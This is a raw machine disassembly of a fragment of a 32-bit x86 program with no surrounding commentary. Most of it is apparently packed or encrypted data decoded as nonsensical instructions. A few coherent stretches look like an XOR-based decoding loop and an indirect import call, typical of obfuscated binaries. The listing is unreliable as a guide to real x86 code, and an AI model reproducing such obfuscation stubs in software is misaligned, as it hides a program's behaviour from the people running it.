  40f84a:	and    DWORD PTR [edx+eax*2-0x11487732],ebp
  40f851:	fstp   DWORD PTR [ebx-0x6bc985c0]
  40f857:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f858:	and    DWORD PTR [esp+eiz*4],0x58
  40f85c:	lahf   
  40f85d:	adc    BYTE PTR [edi],dh
  40f85f:	xchg   ecx,eax
  40f860:	cwde   
  40f861:	in     eax,dx
  40f862:	ins    BYTE PTR es:[edi],dx
  40f863:	retf   
  40f864:	mov    ebx,0x4a6434df
  40f869:	mov    ah,0x85
  40f86b:	jnp    0x40f892
  40f86d:	ret    
  40f86e:	call   0xaff5:0x64e53fb6
  40f875:	sub    al,0x1e
  40f877:	repz sti 
  40f879:	loop   0x40f8d9
  40f87b:	ffree  st(1)
  40f87d:	xchg   ebp,eax
  40f87e:	rcl    BYTE PTR [edx-0x2f],0x10
  40f882:	fs xchg edx,eax
  40f884:	mov    ch,0xf6
  40f886:	or     al,0x42
  40f888:	jmp    0x40f88c
  40f88a:	pop    eax
  40f88b:	cmp    BYTE PTR ss:[ebp+0x62],dh
  40f88f:	jecxz  0x40f8be
  40f891:	data16 or bh,BYTE PTR [ebp+0x67]
  40f895:	retf   
  40f896:	push   ecx
  40f897:	push   ecx
  40f898:	mov    dh,0xfd
  40f89a:	fsubrp st(1),st
  40f89c:	pop    ds
  40f89d:	push   ds
  40f89e:	rcr    BYTE PTR [ecx+0x14],cl
  40f8a1:	mov    eax,ds:0x846d6c73
  40f8a6:	imul   esi,DWORD PTR [eax-0x21],0xffffffbe
  40f8aa:	stos   BYTE PTR es:[edi],al
  40f8ab:	bound  eax,QWORD PTR [ebp+0x3b66533f]
  40f8b1:	or     eax,0x6be76b7d
  40f8b6:	pop    es
  40f8b7:	xchg   esi,eax
  40f8b8:	xchg   BYTE PTR [ebx],dl
  40f8ba:	cli    
  40f8bb:	dec    ebx
  40f8bc:	sbb    cl,BYTE PTR [edx-0x5fe39736]
  40f8c2:	xor    esp,eax
  40f8c4:	pop    esi
  40f8c5:	sbb    esp,ebx
  40f8c7:	xchg   DWORD PTR [edx+0x14],esp
  40f8ca:	sub    eax,0xc1e69a6e
  40f8cf:	(bad)  
  40f8d1:	loope  0x40f91c
  40f8d3:	fadd   QWORD PTR [ebx+ebp*2+0x7a6cf0a2]
  40f8da:	fucomip st,st(6)
  40f8dc:	add    BYTE PTR [edi+0x42],dh
  40f8df:	shl    DWORD PTR [ebx-0x3ba7459],0x8b
  40f8e6:	dec    ebp
  40f8e7:	or     al,0x81
  40f8e9:	xor    eax,0x43463f
  40f8ee:	iret   
  40f8ef:	inc    esi
  40f8f0:	inc    ebx
  40f8f1:	add    BYTE PTR [ebx],dh
  40f8f3:	mov    DWORD PTR [ebx],0x8b05c7c6
  40f8f9:	inc    esi
  40f8fa:	inc    ebx
  40f8fb:	add    BYTE PTR [ebx+0x3b00004b],ch
  40f901:	rol    edi,0x5
  40f904:	cmova  eax,DWORD PTR [ebx+0x0]
  40f908:	push   ebx
  40f909:	add    BYTE PTR ds:[eax],al
  40f90c:	je     0x40fd56
  40f912:	and    DWORD PTR ds:0x434693,edi
  40f918:	mov    eax,DWORD PTR [ebp-0x4]
  40f91b:	mov    edx,DWORD PTR ds:0x4345eb
  40f921:	xor    DWORD PTR ds:0x434653,edx
  40f927:	xor    eax,edi
  40f929:	and    DWORD PTR ds:0x4346bf,0x0
  40f933:	mov    edx,DWORD PTR ds:0x4346bf
  40f939:	inc    edx
  40f93a:	mov    DWORD PTR ds:0x4346bf,edx
  40f940:	cmp    DWORD PTR ds:0x4346bf,0x9
  40f947:	jne    0x40f96a
  40f94d:	push   0x43464b
  40f952:	push   0x434792
  40f957:	push   0x7b5f
  40f95c:	push   0x5aad
  40f961:	push   DWORD PTR [ebp-0xc]
  40f964:	call   DWORD PTR ds:0x4132a4
  40f96a:	cmp    DWORD PTR ds:0x4346bf,0x8
  40f971:	jne    0x40f986
  40f977:	xor    edx,edx
  40f979:	xor    edx,DWORD PTR ds:0x4346bf
  40f97f:	inc    edx
  40f980:	mov    DWORD PTR ds:0x4346bf,edx
  40f986:	cmp    DWORD PTR ds:0x4346bf,0x10
  40f98d:	jb     0x40f933
  40f993:	and    DWORD PTR ds:0x4346bf,edx
  40f999:	add    eax,esi
  40f99b:	push   eax
  40f99c:	push   DWORD PTR [ebp-0x8]
  40f99f:	push   DWORD PTR [ebp-0x4]
  40f9a2:	mov    edx,DWORD PTR ds:0x414afe
  40f9a8:	jmp    0x40fd3b
  40f9ad:	pop    ebx
  40f9ae:	pop    edi
  40f9af:	cld    
  40f9b0:	sub    edi,esp
  40f9b2:	mov    ebp,0x81a66f6d
  40f9b7:	push   esi
  40f9b8:	in     eax,dx
  40f9b9:	pop    ebx
  40f9ba:	fistp  WORD PTR [edx+eiz*1]
  40f9bd:	adc    al,0xbd
  40f9bf:	jle    0x40fa3f
  40f9c1:	hlt    
  40f9c2:	jns    0x40fa42
  40f9c4:	jle    0x40f9c2
  40f9c6:	hlt    
  40f9c7:	and    dl,dl
  40f9c9:	sti    
  40f9ca:	or     eax,0x43ba7a3f
  40f9cf:	pop    edi
  40f9d0:	xlat   BYTE PTR ds:[ebx]
  40f9d1:	enter  0x3f3e,0x32
  40f9d5:	pop    ds
  40f9d6:	push   eax
  40f9d7:	cmc    
  40f9d8:	mov    cl,0xf4
  40f9da:	pop    esi
  40f9db:	adc    eax,0xe2769888
  40f9e0:	popf   
  40f9e1:	inc    edx
  40f9e2:	clc    
  40f9e3:	mov    edx,0x6466d2fd
  40f9e8:	ds sbb al,0xaa
  40f9ec:	xor    al,0x86
  40f9ee:	dec    ebp
  40f9ef:	mov    esi,0xc3b14dec
  40f9f4:	popf   
  40f9f5:	addr16 ds mov esp,0xac369a1e
  40f9fc:	sub    eax,DWORD PTR [edi]
  40f9fe:	adc    al,ah
  40fa00:	sub    eax,0xf47099a1
  40fa05:	mov    ch,0xc9
  40fa07:	in     eax,0x68
  40fa09:	push   esp
  40fa0a:	push   ecx
  40fa0b:	xchg   ebx,eax
  40fa0c:	cmc    
  40fa0d:	inc    ebp
  40fa0e:	pop    ecx
  40fa0f:	jb     0x40f9a3
  40fa11:	lods   al,BYTE PTR gs:[esi]
  40fa13:	int3   
  40fa14:	xor    eax,0x34891287
  40fa19:	lds    esi,FWORD PTR [esi-0x4a5ad610]
  40fa1f:	add    bh,bh
  40fa21:	das    
  40fa22:	call   0xf8f7:0x68967694
  40fa29:	repnz push cs
  40fa2b:	fdivrp st(0),st
  40fa2d:	sub    DWORD PTR [ebp-0x21038480],eax
  40fa33:	mov    WORD PTR ds:0x9a5e9651,cs
  40fa39:	adc    al,0x37
  40fa3b:	scas   eax,DWORD PTR es:[edi]
  40fa3c:	pushf  
  40fa3d:	jg     0x40fa2b
  40fa3f:	test   al,0x91
  40fa42:	xchg   BYTE PTR [esi],al
  40fa44:	mov    bl,0xf9
  40fa46:	aaa    
  40fa47:	test   eax,0x588ccd4d
  40fa4c:	xchg   esp,eax
  40fa4d:	lods   eax,DWORD PTR ds:[esi]
  40fa4e:	sbb    cl,BYTE PTR [edi-0x36]
  40fa51:	lahf   
  40fa52:	xor    al,0x5d
  40fa54:	mov    ds:0x8da41f01,al
  40fa59:	xchg   esi,eax
  40fa5a:	jnp    0x40fa2d
  40fa5c:	add    ch,BYTE PTR [ebx-0x2e]
  40fa5f:	and    BYTE PTR [edi+eax*4],dh
  40fa62:	mov    dh,0xa6
  40fa64:	dec    esp
  40fa65:	push   0x4c
  40fa67:	dec    edi
  40fa68:	mov    esi,0x7b23bdcd
  40fa6d:	scas   al,BYTE PTR es:[edi]
  40fa6e:	fdivr  QWORD PTR [ebp-0x4]
  40fa71:	or     ch,cl
  40fa73:	pop    es
  40fa74:	mov    eax,0x6232f012
  40fa79:	push   ebx
  40fa7a:	out    dx,al
  40fa7b:	ret    0x3ca6
  40fa7e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fa7f:	inc    eax
  40fa80:	sub    al,0x37
  40fa82:	xchg   DWORD PTR [edx],esi
  40fa84:	or     BYTE PTR [ecx+0x65123d72],0x57
  40fa8b:	popf   
  40fa8c:	fwait
  40fa8d:	or     DWORD PTR [ebx+ebx*4-0x7e],edi
  40fa91:	lods   al,BYTE PTR ds:[esi]
  40fa92:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fa93:	fimul  DWORD PTR fs:[ebp-0x713bf7c3]
  40fa9a:	push   edx
  40fa9b:	mov    ds:0x4638aaff,al
  40faa0:	fldenv [edx]
  40faa2:	push   ss
  40faa3:	adc    DWORD PTR [esi+ecx*2],eax
  40faa6:	enter  0x671e,0x17
  40faaa:	std    
  40faab:	mul    BYTE PTR [edx+edi*1]
  40faae:	cmp    BYTE PTR [eax-0x5792b445],dh
  40fab4:	sbb    eax,ebx
  40fab6:	pop    ecx
  40fab7:	push   esi
  40fab8:	aam    0x2d
  40faba:	jl     0x40faf1
  40fabc:	cs out 0x96,al
  40fabf:	ins    BYTE PTR es:[edi],dx
  40fac0:	sbb    esi,DWORD PTR [edi]
  40fac2:	cld    
  40fac3:	adc    DWORD PTR [esi-0x4e75f531],edx
  40fac9:	mov    dl,0x59
  40facb:	mov    eax,0x45471186
  40fad0:	aas    
  40fad1:	(bad)  
  40fad2:	mov    al,ds:0xd95eb6fa
  40fad7:	mov    esp,0x478e3e24
  40fadc:	mov    ah,0xb3
  40fade:	fldenv [esp+ecx*2]
  40fae1:	or     al,0x75
  40fae3:	mov    BYTE PTR [ebp-0x6b3cb275],dl
  40fae9:	pop    ss
  40faea:	fwait
  40faeb:	add    al,0x1e
  40faed:	repnz or eax,0xbcd6da48
  40faf3:	xchg   esp,eax
  40faf4:	(bad)  
  40faf5:	sti    
  40faf6:	mov    dh,al
  40faf8:	mov    esi,0x9059eb5d
  40fafd:	inc    ebp
  40fafe:	mov    ds:0x936ded65,al
  40fb03:	sub    BYTE PTR [edi-0x14410393],0x31
  40fb0a:	pushf  
  40fb0b:	adc    al,0xef
  40fb0d:	and    esp,DWORD PTR [ebx+0x1c]
  40fb10:	daa    
  40fb11:	add    DWORD PTR [edi+0x2e],esp
  40fb14:	adc    DWORD PTR [ebx],edi
  40fb16:	mov    bh,0x83
  40fb18:	lea    ebp,[edi+0xc]
  40fb1b:	jnp    0x40fafd
  40fb1d:	push   ebx
  40fb1e:	in     al,dx
  40fb1f:	cmp    al,BYTE PTR [eax]
  40fb21:	inc    ecx
  40fb22:	adc    al,BYTE PTR [esi+edx*1+0x7e84e442]
  40fb29:	or     bl,ah
  40fb2b:	add    al,0xf4
  40fb2d:	push   0x8
  40fb2f:	dec    ebp
  40fb30:	mov    dh,cl
  40fb32:	and    al,0xb
  40fb34:	jg     0x40fad7
  40fb36:	mov    edx,0x4965bc91
  40fb3b:	sub    bl,bl
  40fb3d:	fcomp  QWORD PTR [edi+edx*4]
  40fb40:	icebp  
  40fb41:	or     dh,BYTE PTR [ebx-0x78056384]
  40fb47:	dec    eax
  40fb48:	cmp    ecx,DWORD PTR [edi+ebx*8-0x66]
  40fb4c:	jl     0x40fbb5
  40fb4e:	inc    esi
  40fb4f:	lea    ebp,[ebp+0x1f8fd8a4]
  40fb55:	mov    ah,BYTE PTR [edx-0x3b9c726]
  40fb5b:	jge    0x40fb86
  40fb5d:	fsub   QWORD PTR [esi-0x64]
  40fb60:	test   BYTE PTR ds:0xf8401e1b,ch
  40fb66:	add    edx,DWORD PTR [esi-0x2a]
  40fb69:	add    ecx,DWORD PTR [edx+0x32c72a46]
  40fb6f:	or     ebp,DWORD PTR [edi+0x48]
  40fb72:	add    bh,BYTE PTR [edx]
  40fb74:	mov    ebp,DWORD PTR [esi]
  40fb76:	ds pop ecx
  40fb78:	jge    0x40fbf3
  40fb7a:	and    DWORD PTR [eax-0x18],ecx
  40fb7d:	xchg   edi,eax
  40fb7e:	jb     0x40fb5b
  40fb80:	mov    edx,DWORD PTR ds:0x44f7f0ee
  40fb86:	sub    DWORD PTR [esi],ecx
  40fb88:	(bad)  
  40fb89:	dec    edx
  40fb8a:	xchg   bl,al
  40fb8c:	mov    DWORD PTR [edi-0x3cc0e089],ebx
  40fb92:	dec    ebp
  40fb93:	(bad)  
  40fb94:	test   DWORD PTR [eax],eax
  40fb96:	lea    eax,ds:0x5fde0bc8
  40fb9c:	adc    eax,0x4fdc8ed4
  40fba1:	sub    DWORD PTR [eax],edx
  40fba3:	xchg   BYTE PTR [edi+0x160bce46],cl
  40fba9:	out    dx,eax
  40fbaa:	inc    eax
  40fbab:	mov    BYTE PTR [ebp+eax*2+0x63951cfc],cl
  40fbb2:	stos   BYTE PTR es:[edi],al
  40fbb3:	aad    0x36
  40fbb5:	scas   eax,DWORD PTR es:[edi]
  40fbb6:	xor    DWORD PTR [esi+0x5a2a930c],ecx
  40fbbc:	dec    ebp
  40fbbd:	sub    DWORD PTR [ecx],edx
  40fbbf:	xor    BYTE PTR [esi+0x6bfdc16b],dl
  40fbc5:	loop   0x40fbbc
  40fbc7:	das    
  40fbc8:	stos   BYTE PTR es:[edi],al
  40fbc9:	retf   
  40fbca:	test   DWORD PTR [ecx],esi
  40fbcc:	push   cs
  40fbcd:	sar    DWORD PTR [eax+0x5f],1
  40fbd0:	cwde   
  40fbd1:	aam    0x45
  40fbd3:	test   eax,0x38d8d4a7
  40fbd9:	bound  esp,QWORD PTR [esi-0x49]
  40fbdc:	pop    esp
  40fbdd:	(bad)  [ebx+esi*8-0x5769ca70]
  40fbe4:	pshufw mm6,QWORD PTR [ebx+eax*2],0x31
  40fbe9:	push   cs
  40fbea:	pop    ebp
  40fbeb:	jmp    0x2fafa7d
  40fbf0:	and    al,0x53
  40fbf2:	and    BYTE PTR [esi],0xbe
  40fbf5:	add    DWORD PTR [edi-0x8],0x52
  40fbf9:	xchg   ebp,eax
  40fbfa:	add    DWORD PTR [eax+0x38e219cc],0x1e613ef9
  40fc04:	push   ebp
  40fc05:	stos   BYTE PTR es:[edi],al
  40fc06:	outs   dx,BYTE PTR ds:[esi]
  40fc07:	dec    ebp
  40fc08:	lock rcr DWORD PTR [edi],cl
  40fc0b:	mov    al,0x52
  40fc0d:	cmp    eax,0xab550d6a
  40fc12:	adc    eax,0x36d286e4
  40fc17:	aas    
  40fc18:	call   0xa1979614
  40fc1d:	cmp    dh,BYTE PTR [esi-0x2480eb78]
  40fc23:	std    
  40fc24:	pop    ebp
  40fc25:	adc    DWORD PTR [esi+0x68d10717],0xf5821ea8
  40fc2f:	stos   DWORD PTR es:[edi],eax
  40fc30:	fucom  st(7)
  40fc32:	xchg   BYTE PTR [ebp-0x7d45a5d],bh
  40fc38:	cdq    
  40fc39:	fiadd  WORD PTR [ebp+0x6f]
  40fc3c:	xchg   edi,eax
  40fc3d:	cmp    DWORD PTR [esi],edx
  40fc3f:	push   esi
  40fc40:	xor    eax,0x73831564
  40fc45:	and    esp,DWORD PTR [edx]
  40fc47:	pop    ecx
  40fc48:	ret    0x2add
  40fc4b:	jmp    0xc331d022
  40fc50:	jns    0x40fc00
  40fc52:	and    al,0xc4
  40fc54:	mov    esi,0x570432e5
  40fc59:	jl     0x40fc7d
  40fc5b:	pop    ecx
  40fc5c:	popf   
  40fc5d:	or     al,0xf7
  40fc5f:	(bad)  
  40fc61:	iret   
  40fc62:	jecxz  0x40fcaa
  40fc64:	(bad)  
  40fc65:	mov    ecx,0x3284f18b
  40fc6a:	call   DWORD PTR [edx+0x31]
  40fc6d:	jecxz  0x40fcc3
  40fc6f:	cld    
  40fc70:	sar    DWORD PTR [eax+0x2efdac2b],0x4d
  40fc77:	push   eax
  40fc78:	mov    eax,ds:0x3bee5583
  40fc7d:	out    dx,eax
  40fc7e:	or     al,0x31
  40fc80:	cwde   
  40fc81:	push   edx
  40fc82:	pop    eax
  40fc83:	adc    DWORD PTR [ecx-0x44],ebx
  40fc86:	mov    esp,0x62cbf57a
  40fc8b:	xor    DWORD PTR [esi],edx
  40fc8d:	mov    ecx,0xd163aee9
  40fc92:	mov    bh,0x1c
  40fc94:	loope  0x40fc4e
  40fc96:	xchg   ebx,eax
  40fc97:	ret    0xef10
  40fc9a:	call   0x94fe:0xdaab0d09
  40fca1:	push   cs
  40fca2:	rol    BYTE PTR [ebx+edi*1-0x11],0x26
  40fca7:	xchg   esi,eax
  40fca8:	fidivr WORD PTR [edi-0x2c139865]
  40fcae:	adc    eax,0x6cdb39ed
  40fcb3:	push   ss
  40fcb4:	pop    esp
  40fcb5:	adc    eax,0x6956de65
  40fcba:	test   esi,ecx
  40fcbc:	adc    esp,DWORD PTR cs:[esi-0x60fde5ec]
  40fcc3:	push   edx
  40fcc4:	cdq    
  40fcc5:	or     DWORD PTR [esi+0x5ae9eb1d],edx
  40fccb:	pop    esi
  40fccc:	rcr    DWORD PTR [esi],0x74
  40fccf:	fiadd  WORD PTR [edi+0x1e4b1274]
  40fcd5:	mov    dh,0xb5
  40fcd7:	and    BYTE PTR cs:[edx+ecx*1],al
  40fcdb:	pop    DWORD PTR ss:[ebx]
  40fcde:	sub    BYTE PTR [esi-0x26],dh
  40fce1:	ror    DWORD PTR [edx-0x35],0xfe
  40fce5:	xchg   edx,eax
  40fce6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fce7:	inc    esp
  40fce8:	popf   
  40fce9:	dec    ebp
  40fcea:	das    
  40fceb:	push   ss
  40fcec:	or     BYTE PTR ds:0x6e17e486,cl
  40fcf2:	shr    BYTE PTR [edi-0x44],0x17
  40fcf6:	or     DWORD PTR [ecx],ecx
  40fcf8:	push   cs
  40fcf9:	jl     0x40fc7e
  40fcfb:	repnz xchg ebp,eax
  40fcfd:	inc    edi
  40fcfe:	push   0x4703b240
  40fd03:	mov    cl,0x40
  40fd05:	fnsave [eax+0x32]
  40fd08:	mov    esi,0x4e0175ab
  40fd0d:	pop    ebx
  40fd0e:	mov    dh,0x4d
  40fd10:	dec    eax
  40fd11:	cli    
  40fd12:	retf   
  40fd13:	jae    0x40fcff
  40fd15:	dec    esi
  40fd16:	jnp    0x40fcee
  40fd18:	fild   DWORD PTR ss:0x58bf51f6
  40fd1f:	push   ebx
  40fd20:	in     eax,0x6c
  40fd22:	jb     0x40fd6f
  40fd24:	mov    ds:0xef0f39b4,al
  40fd29:	iret   
  40fd2a:	sbb    eax,0x4801c237
  40fd2f:	cmp    eax,DWORD PTR [edx+edx*1]
  40fd32:	ins    DWORD PTR es:[edi],dx
  40fd33:	cld    
  40fd34:	in     eax,dx
  40fd35:	pusha  
  40fd36:	loope  0x40fcf8
  40fd38:	in     al,dx
  40fd39:	imul   eax,DWORD PTR [ecx+0xc4ae8],0xfe0d8b00
  40fd43:	dec    edx
  40fd44:	inc    ecx
  40fd45:	add    BYTE PTR [ebx+0x1cc89],cl
  40fd4b:	add    BYTE PTR [ecx-0x7ba74ff],cl
  40fd51:	jmp    0x410121
  40fd56:	mov    eax,DWORD PTR [ebp-0x4]
  40fd59:	mov    ecx,DWORD PTR [ebp+0x10]
  40fd5c:	xor    eax,edi
  40fd5e:	add    eax,esi
  40fd60:	cmp    eax,ecx
  40fd62:	jne    0x41011e
  40fd68:	mov    eax,DWORD PTR [ebp-0x4]
  40fd6b:	xor    eax,edi
  40fd6d:	add    eax,esi
  40fd6f:	mov    ds:0x414b82,eax
  40fd74:	mov    eax,DWORD PTR [ebp-0x4]
  40fd77:	xor    eax,edi
  40fd79:	add    eax,esi
  40fd7b:	mov    ds:0x414b7a,eax
  40fd80:	push   DWORD PTR [ebp-0x8]
  40fd83:	push   DWORD PTR [ebp-0x4]
  40fd86:	call   0x408384
  40fd8b:	jmp    0x41011e
  40fd90:	in     eax,0x27
  40fd92:	ss xor bh,ah
  40fd95:	xor    esp,ebp
  40fd97:	icebp  
  40fd98:	add    DWORD PTR [eax+esi*4+0x77],edi
  40fd9c:	ss sahf 
  40fd9e:	push   0xffffffe0
  40fda0:	cmp    BYTE PTR [eax+0x79f47e7e],0x7e
  40fda7:	jle    0x40fdc3
  40fda9:	data16 shl BYTE PTR [ebx],cl
  40fdac:	ins    BYTE PTR es:[edi],dx
  40fdad:	ret    
  40fdae:	push   0x8720e88c
  40fdb3:	js     0x40fd5d
  40fdb5:	dec    BYTE PTR [eax+esi*4]
  40fdb8:	ins    DWORD PTR es:[edi],dx
  40fdb9:	add    edx,DWORD PTR [edx]
  40fdbb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fdbc:	mov    ch,al
  40fdbe:	fidiv  DWORD PTR ds:[ebx-0x96836c3]
  40fdc5:	jle    0x40fdd7
  40fdc7:	and    ebx,DWORD PTR [eax-0x6c]
  40fdca:	jo     0x40fd64
  40fdcc:	daa    
  40fdcd:	add    eax,0xdb74eb77
  40fdd2:	lds    ebx,FWORD PTR [edx]
  40fdd4:	sub    BYTE PTR [ebp-0xc],dh
  40fdd7:	clc    
  40fdd8:	xchg   ecx,eax
  40fdd9:	xor    eax,0xf4ae888f
  40fdde:	ins    BYTE PTR es:[edi],dx
  40fddf:	scas   eax,DWORD PTR es:[edi]
  40fde0:	jge    0x40fe59
  40fde2:	dec    esi
  40fde3:	test   DWORD PTR [edx],0x1e106cdd
  40fde9:	inc    ebp
  40fdea:	iret   
  40fdeb:	in     al,0xbd
  40fded:	neg    DWORD PTR [ebx+esi*8-0x118b3ca8]
  40fdf4:	inc    al
  40fdf6:	bsf    edx,DWORD PTR [edx-0x6d]
  40fdfa:	push   0x7c
  40fdfc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fdfd:	dec    ebp
  40fdfe:	lea    esp,[edi+0x25b0d27b]
  40fe04:	sub    ecx,DWORD PTR [edx+0x3bb563df]
  40fe0a:	sub    eax,0x829f4f3d
  40fe0f:	int3   
  40fe10:	jb     0x40fe5c
  40fe12:	fadd   DWORD PTR [eax+0x10ca58b]
  40fe18:	mov    DWORD PTR [ecx+0x7d73a555],edx
  40fe1e:	nop
  40fe1f:	mov    ch,BYTE PTR [ebx+0xfd29507]
  40fe25:	push   es
  40fe26:	push   ebx
  40fe27:	rcr    BYTE PTR [ecx+0x47e17211],0x12
  40fe2e:	cwde   
  40fe2f:	leave  
  40fe30:	maxps  xmm3,xmm4
  40fe33:	cmp    DWORD PTR [edx*8+0x22d0b470],ecx
  40fe3a:	inc    edi
  40fe3b:	cmp    BYTE PTR [ecx+0x129f8d5d],bh
  40fe41:	cmp    edi,DWORD PTR [edx]
  40fe43:	bound  ebx,QWORD PTR [edx]
  40fe45:	lds    edx,FWORD PTR [esp+ebp*2]
  40fe48:	or     eax,DWORD PTR [ecx]
  40fe4a:	test   al,0xb5
  40fe4c:	outs   dx,DWORD PTR ds:[esi]
  40fe4d:	add    dh,ch
  40fe4f:	sub    DWORD PTR [ebp+0x8],edx
  40fe52:	push   0xfffffff6
  40fe54:	xchg   ebx,eax
  40fe55:	les    ecx,FWORD PTR [ebx-0x3d226ea5]
  40fe5b:	inc    edi
  40fe5c:	sbb    ebx,DWORD PTR [eax-0x12]
  40fe5f:	(bad)  
  40fe60:	icebp  
  40fe61:	pop    esp
  40fe62:	mov    eax,0xe31b7c8b
  40fe67:	(bad)  
  40fe68:	into   
  40fe69:	dec    ecx
  40fe6a:	or     BYTE PTR [ecx+0x5580ffdc],0x79
  40fe71:	dec    ecx
  40fe72:	cmp    al,0x47
  40fe74:	or     al,0x53
  40fe76:	lods   eax,DWORD PTR ds:[esi]
  40fe77:	and    cl,BYTE PTR [esi-0x2439ba46]
  40fe7d:	xchg   ecx,eax
  40fe7e:	mov    esp,0x5ae7655f
  40fe83:	addr16 hlt 
  40fe85:	sbb    esp,edx
  40fe87:	mov    ecx,0x5adb1408
  40fe8c:	dec    edx
  40fe8d:	cwde   
  40fe8e:	adc    ebp,ecx
  40fe90:	mov    WORD PTR [esi+0x4f],ss
  40fe93:	aam    0xee
  40fe95:	pop    ds
  40fe96:	push   es
  40fe97:	aam    0x1d
  40fe99:	mov    bl,0x9a
  40fe9b:	inc    eax
  40fe9c:	mov    edi,0xdacb5ab3
  40fea1:	jg     0x40feab
  40fea3:	ret    
  40fea4:	xchg   edx,eax
  40fea5:	in     eax,dx
  40fea6:	cmp    BYTE PTR [edi+eiz*8],dl
  40fea9:	aas    
  40feaa:	hlt    
  40feab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40feac:	jge    0x40ff02
  40feae:	out    dx,al
  40feaf:	jae    0x40fe3e
  40feb1:	mov    ebp,0xeed08924
  40feb6:	call   0x8b87:0xfffedd1
  40febd:	dec    eax
  40febe:	scas   eax,DWORD PTR es:[edi]
  40febf:	lods   eax,DWORD PTR ds:[esi]
  40fec0:	adc    eax,0xaa2fd621
  40fec5:	cwde   
  40fec6:	dec    ebp
  40fec7:	or     al,bl
  40fec9:	imul   DWORD PTR [esi-0x5764d850]
  40fecf:	pushaw 
  40fed1:	ins    BYTE PTR es:[edi],dx
  40fed2:	ret    
  40fed3:	pop    es
  40fed4:	push   es
  40fed5:	enter  0xa2fa,0x98
  40fed9:	(bad)  
  40feda:	int    0xbc
  40fedc:	sahf   
  40fedd:	cmp    eax,0x7b5c187b
  40fee2:	sbb    edx,DWORD PTR [edx+0x3f]
  40fee5:	jecxz  0x40fef4
  40fee7:	imul   BYTE PTR gs:[eax+0x11b7875d]
  40feee:	aaa    
  40feef:	mov    ah,0x5f
  40fef1:	push   ds
  40fef2:	dec    ebp
  40fef3:	call   0x818f85e4
  40fef8:	xchg   ebp,eax
  40fef9:	inc    edx
  40fefa:	sub    al,0x72
  40fefc:	stc    
  40fefd:	xchg   BYTE PTR [eax],ah
  40feff:	and    esp,ecx
  40ff01:	fcmovbe st,st(3)
  40ff03:	jmp    0xf36f:0x88e525c3
  40ff0a:	mov    cl,0x41
  40ff0c:	pop    ss
  40ff0d:	ret    0xc753
  40ff10:	sar    DWORD PTR [ecx],0x14
  40ff13:	xlat   BYTE PTR ds:[ebx]
  40ff14:	cdq    
  40ff15:	inc    ebp
  40ff16:	sub    BYTE PTR [ebx+0x29a32c48],bh
  40ff1c:	ret    0xb89b
  40ff1f:	mov    ds:0xc39401b8,eax
  40ff24:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ff25:	mov    cl,cl
  40ff27:	out    dx,al
  40ff28:	shr    DWORD PTR [esi-0x4e592f5c],0xc7
  40ff2f:	mov    bh,0xa7
  40ff31:	or     BYTE PTR [eax-0x4b],0x29
  40ff35:	mov    cl,0x32
  40ff37:	in     al,dx
  40ff38:	or     DWORD PTR [eax],ebx
  40ff3a:	nop
  40ff3b:	inc    ebp
  40ff3c:	jg     0x40ff82
  40ff3e:	cmp    eax,0x3ab9b6e4
  40ff43:	adc    esp,esp
  40ff45:	int3   
  40ff46:	adc    DWORD PTR [ebx-0x1c],ecx
  40ff49:	push   ecx
  40ff4a:	shl    DWORD PTR [ecx-0x6b],cl
  40ff4d:	add    edi,DWORD PTR [esi+esi*4-0x1ce4a51a]
  40ff54:	jbe    0x40ff37
  40ff56:	mov    ah,0xa7
  40ff58:	mov    eax,ds:0x595345aa
  40ff5d:	pop    ecx
  40ff5e:	xor    al,0xe9
  40ff60:	and    eax,edi
  40ff62:	pusha  
  40ff63:	push   edi
  40ff64:	rcl    BYTE PTR [eax-0x70],0xaa
  40ff68:	xchg   ecx,eax
  40ff69:	ja     0x40ff09
  40ff6b:	imul   esi,DWORD PTR [edx],0xd359fc89
  40ff71:	mov    dl,0x6
  40ff73:	add    BYTE PTR [ecx-0x694d0220],cl
  40ff79:	push   ebp
  40ff7a:	repz mov edx,0x1f44f215
  40ff80:	add    edi,0x6f
  40ff83:	xor    eax,0x5e51d02b
  40ff88:	dec    esi
  40ff89:	in     eax,dx
  40ff8a:	mov    DWORD PTR [ebp-0x7b8205ed],ebp
  40ff90:	cmp    al,0x40
  40ff92:	jle    0x40ffd9
  40ff94:	mov    ss,WORD PTR [esi+0x3f]
  40ff97:	jmp    0xa7b5d00a
  40ff9c:	mov    cl,0x24
  40ff9e:	(bad)  
  40ff9f:	cld    
  40ffa0:	(bad)  
  40ffa1:	cwde   
  40ffa2:	mov    bl,0xd5
  40ffa4:	jl     0x40ff71
  40ffa6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ffa7:	ins    DWORD PTR es:[edi],dx
  40ffa8:	mov    eax,ds:0x4327ea7d
  40ffad:	mov    bh,0xb4
  40ffaf:	pop    es
  40ffb0:	cmp    eax,eax
  40ffb2:	lods   eax,DWORD PTR ds:[esi]
  40ffb3:	mov    edi,0xd6236e5d
  40ffb8:	cwde   
  40ffb9:	push   0xf8275425
  40ffbe:	(bad)  
  40ffbf:	retf   0x77ae
  40ffc2:	pop    ss
  40ffc3:	sbb    BYTE PTR [edx+0x4602f4a1],dl
  40ffc9:	and    BYTE PTR [eax+0x51],ch
  40ffcc:	pop    eax
  40ffcd:	mov    ch,0x42
  40ffcf:	je     0x410038
  40ffd1:	in     al,0xa6
  40ffd3:	(bad)  [edi-0x67c3a511]
  40ffd9:	call   0xc1fc4651
  40ffde:	bound  eax,QWORD PTR [ebx]
  40ffe0:	jle    0x410024
  40ffe2:	jae    0x40ffba
  40ffe4:	jecxz  0x40ffe1
  40ffe6:	nop
  40ffe7:	mov    dl,BYTE PTR [edi-0x42cf06c0]
  40ffed:	sti    
  40ffee:	bound  edi,QWORD PTR [ecx]
  40fff0:	jmp    0x23df3e59
  40fff5:	xlat   BYTE PTR ds:[ebx]
  40fff6:	arpl   ax,di
  40fff8:	dec    ebp
  40fff9:	dec    esi
  40fffa:	fsubr  st,st(7)
  40fffc:	leave  
  40fffd:	mov    es,WORD PTR gs:[edi-0x8a58a7b]
  410004:	pop    esi
